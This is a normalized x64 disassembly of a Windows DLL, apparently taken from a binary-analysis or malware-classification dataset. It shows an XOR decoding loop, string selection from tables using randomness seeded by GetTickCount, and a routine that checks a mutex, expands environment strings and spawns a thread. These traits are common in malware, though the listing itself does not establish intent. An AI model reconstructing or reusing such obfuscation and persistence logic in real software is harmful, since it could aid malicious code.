mov rax [ rbp + 0x10 ]
lea rcx [ rax + rdx + 0x4 ]
and edx 0x3
movzx eax [ rdx + rax ]
xor [ rcx ] al
inc r8b
movzx edx r8b
mov eax [ rbp + 0x8 ]
sub rax 0x4
cmp rdx rax
jb r-xdata
mov [ rsp + 0x50 ] 0xf
mov [ rsp + 0x48 ] r12
mov [ rsp + 0x38 ] 0x0
cmp [ rsp + 0x78 ] 0x10
jb r-xdata
mov rcx [ rsp + 0x38 ]
call j_sub_18001c80c
mov [ rsi + 0x18 ] 0xf
mov [ rsi + 0x10 ] r12
mov [ rsi ] 0x0
cmp [ rbx + 0x18 ] 0x10
jae r-xdata
mov rcx [ rsi ]
call j_sub_18001c80c
mov rax rsi
mov rcx [ rsp + 0x88 ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x38 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
mov rcx [ rsp + 0x60 ]
call j_sub_18001c80c
mov rax [ rbx ]
mov [ rsi ] rax
mov [ rbx ] r12
mov r8 [ rbx + 0x10 ]
inc r8
mov rdx rbx
mov rcx rsi
call sub_18001c4a0
jmp r-xdata
mov rax [ rbx + 0x10 ]
mov [ rsi + 0x10 ] rax
mov rax [ rbx + 0x18 ]
mov [ rsi + 0x18 ] rax
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] r12
mov [ rbx ] 0x0
sub_18001b160
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0xa0 ]
sub rsp 0x1a0
mov [ rsp + 0x48 ] 0xfffffffffffffffe
mov [ rsp + 0x1f8 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x98 ] rax
mov r14 r8
mov r13 rdx
mov [ rsp + 0x40 ] rdx
mov [ rsp + 0x38 ] rcx
mov [ rsp + 0x50 ] r8
xor r12d r12d
mov [ rsp + 0x28 ] r12d
lea ecx [ r12 + 0x30 ]
call sub_18001c84c
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov rdi r12
mov rcx rax
call sub_180008850
mov rdi rax
jmp r-xdata
cmp rbx r8
jbe r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov [ rsp + 0x30 ] rdi
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rdi
call sub_1800088d0
mov [ rsp + 0x28 ] r12d
call [ GetTickCount@IAT ]
mov ebx eax
call sub_18001d408
lea ecx [ rax + rbx ]
call sub_18001d3f0
lea rcx [ rsp + 0x28 ]
call sub_18001d2ec
mov r11d [ rsp + 0x28 ]
mov eax 0x24924925
mul r11d
mov eax r11d
sub eax edx
shr eax 0x1
add eax edx
shr eax 0x2
imul eax eax 0x7
sub r11d eax
movsxd rax r11d
lea rcx [ rax + rax * 4 ]
lea rax [ rw-data ]
lea rdx [ rax + rcx * 4 ]
mov r8d 0x14
mov rcx rdi
call sub_1800088c0
lea rdx [ rbp + 0x48 ]
mov rcx rdi
call sub_180009450
nop
mov r8d 0xf
mov [ rsp + 0x70 ] r8
mov [ rsp + 0x68 ] r12
mov [ rsp + 0x58 ] 0x0
mov rbx [ rbp + 0x58 ]
or rax 0xffffffffffffffff
cmp rbx rax
cmova rbx rax
cmp rbx 0xfffffffffffffffe
jbe r-xdata
test rbx rbx
jne r-xdata
xor r8d r8d
mov rdx rbx
lea rcx [ rsp + 0x58 ]
call sub_180003380
mov r8 [ rsp + 0x70 ]
jmp r-xdata
setne al
test al al
je r-xdata
mov [ rsp + 0x68 ] r12
mov [ rsp + 0x58 ] bl
test rbx rbx
mov r8d 0x6
lea rdx [ rw-data ]
mov rcx rdi
call sub_1800088c0
lea rdx [ rbp - 0x30 ]
mov rcx rdi
call sub_180009450
nop
mov [ rsp + 0x20 ] 0x0
mov [ rsp + 0x28 ] r12d
call [ GetTickCount@IAT ]
mov ebx eax
call sub_18001d408
lea ecx [ rax + rbx ]
call sub_18001d3f0
lea rcx [ rsp + 0x28 ]
call sub_18001d2ec
mov r11d [ rsp + 0x28 ]
mov eax 0x38e38e39
mul r11d
shr edx 0x1
lea eax [ rdx + rdx * 8 ]
sub r11d eax
inc r11d
test r11d r11d
jle r-xdata
lea rdx [ rbp + 0x48 ]
cmp [ rbp + 0x60 ] 0x10
cmovae rdx [ rbp + 0x48 ]
lea rcx [ rsp + 0x58 ]
cmp r8 0x10
cmovae rcx [ rsp + 0x58 ]
mov r8 rbx
call sub_18001c4a0
mov [ rsp + 0x68 ] rbx
lea rax [ rsp + 0x58 ]
cmp [ rsp + 0x70 ] 0x10
cmovae rax [ rsp + 0x58 ]
mov [ rax + rbx ] 0x0
mov r8 r14
lea rdx [ rbp - 0x30 ]
lea rcx [ rbp + 0x70 ]
call sub_18001a590
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
lea rcx [ rsp + 0x58 ]
call sub_18001a240
nop
cmp [ rbp + 0x88 ] 0x10
jb r-xdata
mov r15d r11d
lea rdi [ rw-data ]
mov r13 [ rsp + 0x30 ]
nop [ rax ] eax
test rdi rdi
je r-xdata
mov rcx [ rbp + 0x70 ]
call j_sub_18001c80c
jmp r-xdata
test ecx ecx
sete al
test al al
je r-xdata
cmp rdi rbx
jae r-xdata
mov [ r13 + 0x18 ] 0xf
mov [ r13 + 0x10 ] r12
mov [ r13 ] 0x0
lea rax [ rsp + 0x58 ]
cmp r13 rax
je r-xdata
mov rcx rdi
call sub_180008890
mov rcx rdi
call j_sub_18001c80c
lea rdx [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x10
cmovae rdx [ rbp - 0x30 ]
lea rcx [ rbp - 0x80 ]
cmp rsi 0x10
cmovae rcx r12
mov r8 [ rsp + 0x28 ]
call sub_18001ded0
movsxd rcx eax
test eax eax
jne r-xdata
cmp [ rsp + 0x20 ] 0x0
jne r-xdata
xor eax eax
cmp rdi rbx
setne al
mov ecx eax
or ecx 0xffffffff
jmp r-xdata
cmp [ rbp - 0x18 ] 0x10
jb r-xdata
cmp [ r13 + 0x18 ] 0x10
jb r-xdata
test ecx ecx
sete al
test al al
sete al
test al al
je r-xdata
cmp rdi rbx
jae r-xdata
mov bl 0x1
mov [ rsp + 0x20 ] bl
mov r8 r14
lea rdx [ rbp - 0x80 ]
lea rcx [ rbp + 0x20 ]
call sub_18001a590
nop
lea r8 [ rw-data ]
mov rdx rax
lea rcx [ rbp - 0x58 ]
call sub_18001a540
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
lea rcx [ rsp + 0x58 ]
call sub_18001a240
nop
cmp [ rbp - 0x40 ] 0x10
jb r-xdata
mov [ rbp - 0x18 ] 0xf
mov [ rbp - 0x20 ] r12
mov [ rbp - 0x30 ] 0x0
cmp [ rsp + 0x70 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x30 ]
call j_sub_18001c80c
mov [ r13 + 0x18 ] 0xf
mov [ r13 + 0x10 ] r12
mov [ r13 ] 0x0
mov rcx [ rsp + 0x70 ]
cmp rcx 0x10
jae r-xdata
mov rcx [ r13 ]
call j_sub_18001c80c
cmp rsi 0x10
jb r-xdata
xor edi edi
mov [ rsp + 0x28 ] edi
call [ GetTickCount@IAT ]
mov ebx eax
call sub_18001d408
add ebx eax
mov ecx ebx
call sub_18001d3f0
lea rcx [ rsp + 0x28 ]
call sub_18001d2ec
mov eax 0x4ec4ec4f
mov r8d [ rsp + 0x28 ]
mul r8d
shr edx 0x2
imul edx edx 0xd
mov eax 0x1
sub eax edx
add r8d eax
mov [ rsp + 0x28 ] r8d
lea rdx [ rbp + 0x20 ]
mov rcx [ rsp + 0x38 ]
call sub_18001ac30
nop
mov r8 rax
lea rdx [ rbp - 0x80 ]
lea rcx [ rbp - 0x8 ]
call sub_18001a640
nop
lea r8 [ rw-data ]
mov rdx rax
lea rcx [ rbp - 0x58 ]
call sub_18001a540
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
lea rcx [ rsp + 0x58 ]
call sub_18001a240
nop
cmp [ rbp - 0x40 ] 0x10
jb r-xdata
xor eax eax
cmp rdi rbx
setne al
mov ecx eax
or ecx 0xffffffff
jmp r-xdata
mov [ rbp - 0x40 ] 0xf
xor r12d r12d
mov [ rbp - 0x48 ] r12
mov [ rbp - 0x58 ] r12b
cmp [ rbp + 0x38 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x58 ]
call j_sub_18001c80c
mov [ rsp + 0x70 ] 0xf
mov [ rsp + 0x68 ] r12
mov [ rsp + 0x58 ] 0x0
cmp [ rbp + 0x60 ] 0x10
jb r-xdata
mov rcx [ rsp + 0x58 ]
call j_sub_18001c80c
mov rax [ rsp + 0x58 ]
mov [ r13 ] rax
mov [ rsp + 0x58 ] r12
mov r8 [ rsp + 0x68 ]
inc r8
lea rdx [ rsp + 0x58 ]
mov rcx r13
call sub_18001c4a0
mov rcx [ rsp + 0x70 ]
jmp r-xdata
xor r12d r12d
movzx ebx [ rsp + 0x20 ]
mov rcx r12
call j_sub_18001c80c
mov [ rbp - 0x40 ] 0xf
mov [ rbp - 0x48 ] rdi
mov [ rbp - 0x58 ] 0x0
cmp [ rbp + 0x10 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x58 ]
call j_sub_18001c80c
cmp [ rbp - 0x68 ] 0x10
jb r-xdata
mov rcx [ rbp + 0x20 ]
call j_sub_18001c80c
nop
mov [ rbp + 0x60 ] 0xf
mov [ rbp + 0x58 ] r12
mov [ rbp + 0x48 ] 0x0
cmp [ r14 + 0x18 ] 0x10
jb r-xdata
mov rcx [ rbp + 0x48 ]
call j_sub_18001c80c
mov rax [ rsp + 0x68 ]
mov [ r13 + 0x10 ] rax
mov [ r13 + 0x18 ] rcx
mov [ rsp + 0x70 ] 0xf
mov [ rsp + 0x68 ] r12
mov [ rsp + 0x58 ] 0x0
mov [ rsp + 0x28 ] r12d
call [ GetTickCount@IAT ]
mov ebx eax
call sub_18001d408
lea ecx [ rax + rbx ]
call sub_18001d3f0
lea rcx [ rsp + 0x28 ]
call sub_18001d2ec
mov r11d [ rsp + 0x28 ]
mov eax 0xba2e8ba3
mul r11d
shr edx 0x3
imul edx edx 0xb
sub r11d edx
mov edx r11d
imul rdx rdx 0xf
add rdx rdi
mov r8d 0xf
mov rcx r13
call sub_1800088c0
lea rdx [ rbp - 0x80 ]
mov rcx r13
call sub_180009450
nop
lea rdx [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x10
cmovae rdx [ rbp - 0x30 ]
lea rcx [ rbp - 0x80 ]
mov r12 [ rbp - 0x80 ]
mov rsi [ rbp - 0x68 ]
cmp rsi 0x10
cmovae rcx r12
mov rbx [ rbp - 0x20 ]
mov rax rbx
mov rdi [ rbp - 0x70 ]
cmp rdi rbx
cmovb rax rdi
mov [ rsp + 0x28 ] rax
mov r8 rax
call sub_18001ded0
movsxd rcx eax
test eax eax
jne r-xdata
test bl bl
mov r13 [ rsp + 0x40 ]
je r-xdata
mov [ rbp + 0x10 ] 0xf
mov [ rbp + 0x8 ] rdi
mov [ rbp - 0x8 ] 0x0
cmp [ rbp + 0x38 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x8 ]
call j_sub_18001c80c
dec r15
lea rdi [ rw-data ]
jne r-xdata
mov rcx [ rbp - 0x80 ]
call j_sub_18001c80c
jmp r-xdata
mov [ r14 + 0x18 ] 0xf
mov [ r14 + 0x10 ] r12
mov [ r14 ] 0x0
mov rax r13
mov rcx [ rbp + 0x98 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0x1f8 ]
add rsp 0x1a0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx [ r14 ]
call j_sub_18001c80c
mov rdi [ rsp + 0x30 ]
mov [ rbp - 0x68 ] 0xf
mov [ rbp - 0x70 ] r12
mov [ rbp - 0x80 ] 0x0
mov edi 0x1
mov r8d edi
lea rdx [ r--data ]
lea rcx [ rbp - 0x80 ]
call sub_180009120
nop
mov [ rsp + 0x28 ] r12d
call [ GetTickCount@IAT ]
mov ebx eax
call sub_18001d408
lea ecx [ rax + rbx ]
call sub_18001d3f0
lea rcx [ rsp + 0x28 ]
call sub_18001d2ec
mov eax 0xaaaaaaab
mov r8d [ rsp + 0x28 ]
mul r8d
shr edx 0x1
lea eax [ rdx + rdx * 2 ]
mov ecx 0x3
sub ecx eax
add r8d ecx
mov [ rsp + 0x28 ] r8d
lea rdx [ rbp - 0x8 ]
mov rsi [ rsp + 0x38 ]
mov rcx rsi
call sub_18001ac30
nop
lea r8 [ rbp - 0x80 ]
mov rdx rax
lea rcx [ rbp + 0x20 ]
call sub_18001a4b0
nop
cmp [ rbp + 0x10 ] 0x10
jb r-xdata
mov r12 [ rbp - 0x80 ]
mov rsi [ rbp - 0x68 ]
mov rcx [ rbp + 0x20 ]
call j_sub_18001c80c
mov [ rbp + 0x10 ] 0xf
mov [ rbp + 0x8 ] r12
mov [ rbp - 0x8 ] 0x0
cmp [ rbp - 0x68 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x8 ]
call j_sub_18001c80c
mov [ rbp - 0x68 ] 0xf
mov [ rbp - 0x70 ] r12
mov [ rbp - 0x80 ] 0x0
mov [ rsp + 0x28 ] r12d
call [ GetTickCount@IAT ]
mov ebx eax
call sub_18001d408
lea ecx [ rax + rbx ]
call sub_18001d3f0
lea rcx [ rsp + 0x28 ]
call sub_18001d2ec
mov eax 0x4ec4ec4f
mov r8d [ rsp + 0x28 ]
mul r8d
shr edx 0x2
imul edx edx 0xd
sub edi edx
add r8d edi
mov [ rsp + 0x28 ] r8d
lea rdx [ rbp + 0x70 ]
mov rcx rsi
call sub_18001ac30
nop
mov r8 rax
lea rdx [ rbp + 0x20 ]
lea rcx [ rbp - 0x58 ]
call sub_18001a640
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
lea rcx [ rsp + 0x58 ]
call sub_18001a240
nop
cmp [ rbp - 0x40 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x80 ]
call j_sub_18001c80c
mov [ rbp - 0x40 ] 0xf
mov [ rbp - 0x48 ] r12
mov [ rbp - 0x58 ] 0x0
cmp [ rbp + 0x88 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x58 ]
call j_sub_18001c80c
cmp [ rbp + 0x38 ] 0x10
jb r-xdata
mov rcx [ rbp + 0x70 ]
call j_sub_18001c80c
nop
mov rdi [ rsp + 0x30 ]
mov rcx [ rbp + 0x20 ]
call j_sub_18001c80c
jmp r-xdata
sub_18001b990
push rdi
sub rsp 0x90
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rsp + 0xb0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x80 ] rax
mov rdi rdx
mov rbx rcx
mov [ rsp + 0x20 ] 0x0
lea rdx [ rsp + 0x58 ]
call sub_18001af60
nop
mov [ rsp + 0x48 ] 0xf
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x30 ] 0x0
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x30 ]
call sub_180003a40
lea r8 [ rsp + 0x30 ]
mov rdx rdi
mov rcx rbx
call sub_18001b160
nop
cmp [ rsp + 0x70 ] 0x10
jb r-xdata
mov rax rdi
mov rcx [ rsp + 0x80 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0xb0 ]
add rsp 0x90
pop rdi
retn
mov rcx [ rsp + 0x58 ]
call j_sub_18001c80c
sub_18001ba60
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x130 ]
sub rsp 0x230
mov [ rsp + 0x58 ] 0xfffffffffffffffe
mov [ rsp + 0x270 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x120 ] rax
mov ebx r8d
mov rsi rdx
mov [ rsp + 0x60 ] rdx
xor r13d r13d
mov [ rsp + 0x20 ] r13d
mov [ rdx ] r13
mov [ rdx + 0x8 ] r13
mov [ rdx + 0x10 ] r13
mov [ rsp + 0x20 ] 0x1
lea rcx [ rsp + 0x28 ]
call sub_180008850
nop
lea r8d [ r13 + 0xd ]
lea rdx [ rw-data ]
lea rcx [ rsp + 0x28 ]
call sub_1800088d0
mov edi r13d
mov eax [ rw-data ]
add eax 0x456
je r-xdata
lea rcx [ rsp + 0x28 ]
call sub_180008890
mov rax rsi
mov rcx [ rbp + 0x120 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0x270 ]
add rsp 0x230
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov r12d r13d
mov r14d 0xffffffff
lea r15 [ rw-data ]
nop [ rax + rax ] ax
inc edi
add r12d 0x3e8
mov ecx [ rw-data ]
add ecx 0x456
cmp edi ecx
jb r-xdata
mov eax 0xdbeb61ef
mul ebx
shr edx 0x7
imul edx edx 0x95
mov eax ebx
sub eax edx
mov edx eax
imul rdx rdx 0x32
add rdx r15
mov r8d 0x32
lea rcx [ rsp + 0x28 ]
call sub_1800088c0
lea rdx [ rbp + 0xf8 ]
lea rcx [ rsp + 0x28 ]
call sub_1800092e0
nop
mov eax 0x8421085
mul ebx
mov ecx ebx
sub ecx edx
shr ecx 0x1
add ecx edx
shr ecx 0x4
imul ecx ecx 0x1f
mov edx ebx
sub edx ecx
imul rdx rdx 0x1e
lea rax [ rw-data ]
add rdx rax
mov r8d 0x1e
lea rcx [ rsp + 0x28 ]
call sub_1800088c0
lea rdx [ rsp + 0x68 ]
lea rcx [ rsp + 0x28 ]
call sub_1800092e0
nop
mov eax 0xa57eb503
mul ebx
shr edx 0x6
imul edx edx 0x63
mov eax ebx
sub eax edx
mov edx eax
imul rdx rdx 0x32
lea rax [ rw-data ]
add rdx rax
mov r8d 0x32
lea rcx [ rsp + 0x28 ]
call sub_1800088c0
lea rdx [ rbp - 0x70 ]
lea rcx [ rsp + 0x28 ]
call sub_1800092e0
nop
lea ecx [ r12 + rbx ]
mov eax 0xdbeb61ef
mul ecx
shr edx 0x7
imul edx edx 0x95
sub ecx edx
mov edx ecx
imul rdx rdx 0x32
add rdx r15
mov r8d 0x32
lea rcx [ rsp + 0x28 ]
call sub_1800088c0
lea rdx [ rbp + 0x8 ]
lea rcx [ rsp + 0x28 ]
call sub_1800092e0
nop
mov r8d 0xa
lea rdx [ rw-data ]
lea rcx [ rsp + 0x28 ]
call sub_1800088c0
lea rdx [ rbp - 0x20 ]
lea rcx [ rsp + 0x28 ]
call sub_1800092e0
nop
mov r8d 0x12
lea rdx [ rw-data ]
lea rcx [ rsp + 0x28 ]
call sub_1800088c0
lea rdx [ rbp + 0x58 ]
lea rcx [ rsp + 0x28 ]
call sub_1800092e0
nop
lea r8 [ rbp + 0xf8 ]
mov rdx rax
lea rcx [ rbp + 0xd0 ]
call sub_18000c760
nop
lea r8 [ rsp + 0x68 ]
mov rdx rax
lea rcx [ rbp + 0x80 ]
call sub_18000c760
nop
lea r8 [ rbp - 0x70 ]
mov rdx rax
lea rcx [ rbp + 0x30 ]
call sub_18000c760
nop
lea r8 [ rbp + 0x8 ]
mov rdx rax
lea rcx [ rbp + 0xa8 ]
call sub_18000c760
nop
lea r8 [ rbp - 0x20 ]
mov rdx rax
lea rcx [ rbp - 0x48 ]
call sub_18000c760
nop
cmp [ rbp + 0xc0 ] 0x8
jb r-xdata
imul ebx ebx 0x15a4e35
lea eax [ rbx + 0x1 ]
cqo
and rdx r14
lea rbx [ rdx + rax ]
and rbx r14
sub rbx rdx
cmp edi 0x455
jle r-xdata
mov [ rbp + 0xc0 ] 0x7
mov [ rbp + 0xb8 ] r13
mov [ rbp + 0xa8 ] r13w
cmp [ rbp + 0x48 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xa8 ]
call j_sub_18001c80c
mov [ rbp + 0x48 ] 0x7
mov [ rbp + 0x40 ] r13
mov [ rbp + 0x30 ] r13w
cmp [ rbp + 0x98 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x30 ]
call j_sub_18001c80c
mov [ rbp + 0x98 ] 0x7
mov [ rbp + 0x90 ] r13
mov [ rbp + 0x80 ] r13w
cmp [ rbp + 0xe8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x80 ]
call j_sub_18001c80c
mov [ rbp + 0xe8 ] 0x7
mov [ rbp + 0xe0 ] r13
mov [ rbp + 0xd0 ] r13w
cmp [ rbp + 0x70 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xd0 ]
call j_sub_18001c80c
mov [ rbp + 0x70 ] 0x7
mov [ rbp + 0x68 ] r13
mov [ rbp + 0x58 ] r13w
lea rdx [ rbp - 0x48 ]
mov rcx rsi
call sub_180009dd0
nop
cmp [ rbp - 0x30 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x58 ]
call j_sub_18001c80c
mov [ rbp - 0x30 ] 0x7
mov [ rbp - 0x38 ] r13
mov [ rbp - 0x48 ] r13w
cmp [ rbp - 0x8 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x48 ]
call j_sub_18001c80c
mov [ rbp - 0x8 ] 0x7
mov [ rbp - 0x10 ] r13
mov [ rbp - 0x20 ] r13w
cmp [ rbp + 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x20 ]
call j_sub_18001c80c
mov [ rbp + 0x20 ] 0x7
mov [ rbp + 0x18 ] r13
mov [ rbp + 0x8 ] r13w
cmp [ rbp - 0x58 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x8 ]
call j_sub_18001c80c
mov [ rbp - 0x58 ] 0x7
mov [ rbp - 0x60 ] r13
mov [ rbp - 0x70 ] r13w
cmp [ rbp - 0x80 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x70 ]
call j_sub_18001c80c
mov [ rbp - 0x80 ] 0x7
mov [ rsp + 0x78 ] r13
mov [ rsp + 0x68 ] r13w
cmp [ rbp + 0x110 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x68 ]
call j_sub_18001c80c
mov rcx [ rbp + 0xf8 ]
call j_sub_18001c80c
CloseStateCount
mov [ rsp + 0x18 ] rdi
mov [ rsp + 0x20 ] r12
push rbp
lea rbp [ rsp - 0x57 ]
sub rsp 0xf0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x47 ] rax
lea r9 [ rw-data ]
lea rdx [ rw-data ]
lea rcx [ rbp - 0x69 ]
mov r8d 0x5a
mov [ rsp + 0x20 ] 0xb
call sub_180008860
lea rdx [ rbp + 0x1f ]
lea rcx [ rbp - 0x69 ]
call sub_1800092e0
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov r8 rax
mov edx 0x1
xor ecx ecx
call [ OpenMutexW@IAT ]
cmp [ rbp + 0x37 ] 0x8
mov rdi rax
jb r-xdata
mov rax [ rax ]
xor r12d r12d
mov [ rbp + 0x37 ] 0x7
mov [ rbp + 0x2f ] r12
mov [ rbp + 0x1f ] r12w
call [ GetLastError@IAT ]
lea rcx [ rbp - 0x69 ]
cmp eax 0x2
je r-xdata
mov rcx [ rbp + 0x1f ]
call j_sub_18001c80c
lea rdx [ rw-data ]
mov r8d 0xb
mov [ rsp + 0x100 ] rbx
mov [ rsp + 0x108 ] rsi
call sub_1800088d0
lea rdx [ rw-data ]
lea rcx [ rbp - 0x69 ]
mov r8d 0x24
call sub_1800088c0
lea rdx [ rbp - 0x9 ]
lea rcx [ rbp - 0x69 ]
call sub_1800092e0
cmp [ rbp + 0xf ] 0x8
lea rcx [ rbp - 0x9 ]
cmovae rcx [ rbp - 0x9 ]
xor r8d r8d
xor edx edx
call [ ExpandEnvironmentStringsW@IAT ]
mov edx 0x2
mov ecx eax
mov ebx eax
call sub_18001d210
cmp [ rbp + 0xf ] 0x8
lea rcx [ rbp - 0x9 ]
cmovae rcx [ rbp - 0x9 ]
mov r8d ebx
mov rdx rax
mov rsi rax
call [ ExpandEnvironmentStringsW@IAT ]
lea r8 [ sub_18000ae20 ]
mov r9 rsi
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] r12
mov [ rsp + 0x20 ] r12d
call [ CreateThread@IAT ]
lea rcx [ rbp - 0x39 ]
xor r9d r9d
xor r8d r8d
xor edx edx
mov rbx rax
call [ GetMessageW@IAT ]
test eax eax
je r-xdata
call sub_180008890
xor al al
jmp r-xdata
mov rcx rsi
call sub_18001c80c
mov rcx rdi
call [ CloseHandle@IAT ]
cmp [ rbp + 0xf ] 0x8
mov rsi [ rsp + 0x108 ]
mov rbx [ rsp + 0x100 ]
jb r-xdata
lea rcx [ rbp - 0x39 ]
call [ TranslateMessage@IAT ]
lea rcx [ rbp - 0x39 ]
call [ DispatchMessageW@IAT ]
mov edx 0x1f4
mov rcx rbx
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
mov rcx [ rbp + 0x47 ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0xf0 ]
mov rdi [ r11 + 0x20 ]
mov r12 [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
lea rcx [ rbp - 0x69 ]
mov [ rbp + 0xf ] 0x7
mov [ rbp + 0x7 ] r12
mov [ rbp - 0x9 ] r12w
call sub_180008890
mov al 0x1
mov rcx [ rbp - 0x9 ]
call j_sub_18001c80c
cmp eax 0xffffffff
je r-xdata
lea rcx [ rbp - 0x39 ]
xor r9d r9d
xor r8d r8d
xor edx edx
call [ GetMessageW@IAT ]
test eax eax
jne r-xdata
sub_18001c234
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_18001c40c
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18001c80c
sub_18001c314
test rdx rdx
je r-xdata
retn
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi rcx
mov rcx rdx
mov rbx rdx
call sub_18001e2c0
mov rsi rax
lea rcx [ rax + 0x1 ]
call sub_18001d820
mov [ rdi + 0x8 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
lea rdx [ rsi + 0x1 ]
mov r8 rbx
mov rcx rax
call sub_18001e248
mov [ rdi + 0x10 ] 0x1
sub_18001c398
push rbx
sub rsp 0x20
and [ rcx + 0x8 ] 0x0
lea rax [ r--data ]
mov [ rcx + 0x10 ] 0x0
mov [ rcx ] rax
mov rdx [ rdx ]
mov rbx rcx
call sub_18001c314
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18001c3c8
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
cmp rcx rdx
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
call sub_18001c370
cmp [ rdi + 0x10 ] 0x0
je r-xdata
mov rax [ rdi + 0x8 ]
mov [ rbx + 0x8 ] rax
mov rdx [ rdi + 0x8 ]
mov rcx rbx
call sub_18001c314
jmp r-xdata
sub_18001c41c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_18001c370
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18001c80c
sub_18001c4a0
mov r11 rcx
sub rdx rcx
jb r-xdata
add rcx r8
cmp r8 0x8
jb r-xdata
cmp r8 0x8
jb r-xdata
test r8 r8
jne r-xdata
test cl 0x7
je r-xdata
test r8 r8
jne r-xdata
test cl 0x7
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov al [ rdx + rcx ]
mov [ rcx ] al
inc rcx
dec r8
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
inc rcx
cmp rdx 0xfffffffffffff000
ja r-xdata
mov rax [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
sub rcx 0x20
mov [ rcx + 0x18 ] rax
mov [ rcx + 0x10 ] r10
mov rax [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec r9
mov [ rcx + 0x8 ] rax
mov [ rcx ] r10
jne r-xdata
sub rcx 0x8
mov rax [ rdx + rcx ]
dec r9
mov [ rcx ] rax
jne r-xdata
test cl 0x4
je r-xdata
sub rcx 0x2
mov ax [ rdx + rcx ]
sub r8 0x2
mov [ rcx ] ax
cmp rdx 0x1000
jb r-xdata
mov rax [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
add rcx 0x20
mov [ rcx - 0x20 ] rax
mov [ rcx - 0x18 ] r10
mov rax [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec r9
mov [ rcx - 0x10 ] rax
mov [ rcx - 0x8 ] r10
jne r-xdata
mov rax [ rdx + rcx ]
mov [ rcx ] rax
add rcx 0x8
dec r9
jne r-xdata
test cl 0x4
je r-xdata
mov ax [ rdx + rcx ]
